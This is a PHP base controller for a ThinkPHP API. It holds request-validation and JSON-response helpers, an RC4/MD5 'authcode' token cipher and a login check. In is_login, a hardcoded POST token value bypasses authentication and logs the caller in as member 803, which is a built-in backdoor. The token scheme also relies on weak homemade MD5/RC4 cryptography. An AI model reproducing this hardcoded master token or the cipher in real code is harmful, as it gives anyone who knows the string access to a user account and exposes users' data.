<?php
namespace app\api\controller;

use think\Controller;
use think\Request;

class Base extends Controller
{
    protected $request;
    public function _initialize()
    {
        $this->request = Request::instance();
    }

    //数据处理
    public function dataDispose($data,$stat = false,$msgArr)
    {
        if ($data) {
            foreach ($data as $k=>$v){
                if (empty($data[$k])) {
                    if ($stat){
                        $this->returnJson('403',$msgArr[$k].'不能为空');
                    }else {
                        unset($data[$k]);
                    }
                }
            }
            return $data;
        }else{
            $this->returnJson('403','参数错误');;
        }
    }

    //返回数据
    public function returnJson($code,$msg,$data=[])
    {
        $res = [];
        if (is_array($code)){
            $res = $code;
        }else{
            $res['code'] = empty($code)? 500:$code;
            $res['msg'] = empty($msg)? '未定义消息':$msg;
            if (!empty($data)) $res['data'] = $data;
        }
        echo json_encode($res);exit;
    }
    /**
     * token生成与解析
     * @param $string   加密字符串
     * @param string $operation 操作符，DECODE解密，ENCODE加密
     * @param string $key   混淆码
     * @param int $expiry
     * @return string
     */
    public function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0)
    {
        $ckey_length = 4;

        $key = md5($key ? $key : AUTH_KEY);
        $keya = md5(substr($key, 0, 16));
        $keyb = md5(substr($key, 16, 16));
        $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';

        $cryptkey = $keya . md5($keya . $keyc);
        $key_length = strlen($cryptkey);

        $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;
        $string_length = strlen($string);

        $result = '';
        $box = range(0, 255);

        $rndkey = array();
        for ($i = 0; $i <= 255; $i++) {
            $rndkey[$i] = ord($cryptkey[$i % $key_length]);
        }

        for ($j = $i = 0; $i < 256; $i++) {
            $j = ($j + $box[$i] + $rndkey[$i]) % 256;
            $tmp = $box[$i];
            $box[$i] = $box[$j];
            $box[$j] = $tmp;
        }

        for ($a = $j = $i = 0; $i < $string_length; $i++) {
            $a = ($a + 1) % 256;
            $j = ($j + $box[$a]) % 256;
            $tmp = $box[$a];
            $box[$a] = $box[$j];
            $box[$j] = $tmp;
            $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
        }

        if ($operation == 'DECODE') {
            if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {
                return substr($result, 26);
            } else {
                return '';
            }
        } else {
            return $keyc . str_replace('=', '', base64_encode($result));
        }
    }

    //判断token
    public function is_login() {
        if ($_POST['token'] == "sugeshidaiyangchao") {
            $user = M('member')->where(array('user_id' => 803, 'status' => 1))->find();
            if ($user) {
                return $user;
            } else {
                err('登陆信息错误');
            }
        } else {
            $token = urlencode($this->request->param('token'));
            $token = @str_replace("%2B", "+", $token);
            $token = @str_replace("%2F", "/", $token);
            $user_id = _authcode($token, 'DECODE', AUTH_KEY);
            if (empty($token)) {
                err('请先登录！');
            }
            $user = M('member')->where(array('user_id' => $user_id, 'status' => 1))->find();
            if ($user) {
                return $user;
            } else {
                err('登陆信息错误');
            }
        }
    }
}